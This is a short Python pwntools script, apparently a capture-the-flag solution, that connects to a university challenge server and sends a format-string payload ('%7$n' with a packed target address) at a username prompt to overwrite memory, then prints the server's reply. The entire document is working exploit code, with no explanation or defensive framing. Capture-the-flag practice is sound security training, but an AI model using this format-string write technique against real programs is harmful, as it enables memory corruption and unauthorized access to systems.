from pwn import *

HOST = "cyberchallenge.disi.unitn.it"
PORT = 9203
r = remote(HOST, PORT)

r.sendlineafter(
    b"username: ",
    b"   %7$n " + p64(0x000000000040408c)
)

print(r.recvall().decode(errors="ignore"))
